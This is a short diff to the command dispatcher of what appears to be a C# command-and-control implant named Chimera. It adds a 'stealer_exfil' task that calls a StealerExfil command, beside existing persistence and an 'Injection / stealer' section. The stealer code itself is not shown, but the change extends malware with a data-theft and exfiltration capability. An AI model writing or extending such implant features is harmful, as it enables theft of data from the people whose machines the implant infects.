@@ -119,6 +119,10 @@ namespace Chimera
                         output = Commands.Persist2.Execute(parameters);
                         break;
 
+                    case "stealer_exfil":
+                        output = Commands.StealerExfil.Execute(taskID, CallbackUUID);
+                        break;
+
                     // --------------------------------------------------------
                     // Injection / stealer
                     // --------------------------------------------------------
